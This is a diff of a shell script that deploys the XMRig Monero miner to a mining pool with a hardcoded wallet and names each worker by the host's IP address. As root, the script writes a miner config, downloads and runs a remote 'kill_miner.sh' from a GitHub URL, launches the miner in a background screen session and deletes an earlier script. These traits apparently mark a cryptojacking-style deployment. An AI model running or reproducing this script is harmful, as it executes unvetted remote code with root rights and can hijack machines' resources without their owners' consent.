@@ -1,5 +1,7 @@
 #!/bin/sh
-screen -S XMR -X quit
+#read -p "What is Worker? (exp: vps01): " worker
+#IP4=$(curl -4 -s icanhazip.com)
+rm -fv danielchau.sh
 sudo apt-get update -y
 sudo apt-get install cpulimit -y
 sudo apt-get install bc -y
@@ -15,4 +17,45 @@ convert_dots_to_underscore() {
 }
 IP4_UNDERSCORE=$(convert_dots_to_underscore "$IP4")
 
-screen -dmS XMR ./xmrig -a randomx --url pool.supportxmr.com:3333 --tls --user 4AoybN2iCjpL8joYVGRBn4W1p5sMjh4p791aKpJEYPYS2qTTi2y1Ta2jgQoL8VRTek36ogqBnCSbg3UyTRbbaA4eAUrGFem.$country$cores-$IP4_UNDERSCORE
+cat /dev/null > /root/config.json
+cat >>/root/config.json <<EOF
+{
+    "pools": [
+        {
+            "algo": "rx/0",
+            "coin": null,
+            "url": "pool.supportxmr.com:3333",
+            "user": "4AoybN2iCjpL8joYVGRBn4W1p5sMjh4p791aKpJEYPYS2qTTi2y1Ta2jgQoL8VRTek36ogqBnCSbg3UyTRbbaA4eAUrGFem",
+            "pass": "$country$cores-$IP4_UNDERSCORE",
+            "rig-id": null,
+            "nicehash": true,
+            "keepalive": false,
+            "enabled": true,
+            "tls": false,
+            "sni": false,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null,
+            "submit-to-origin": false
+        }  
+    ]
+}
+EOF
+cat /dev/null > /root/danielluis1921.sh
+cat >>/root/danielluis1921.sh <<EOF
+#!/bin/bash
+./kill_miner.sh
+screen -S XMR -X quit
+sleep 3
+screen -dmS XMR ./xmrig --donate-level 1 --threads=$cores --background -c config.json
+sleep 3
+EOF
+chmod +x /root/danielluis1921.sh
+
+wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
+chmod +x /root/kill_miner.sh
+./kill_miner.sh
+sleep 3
+./danielluis1921.sh
+sleep 20
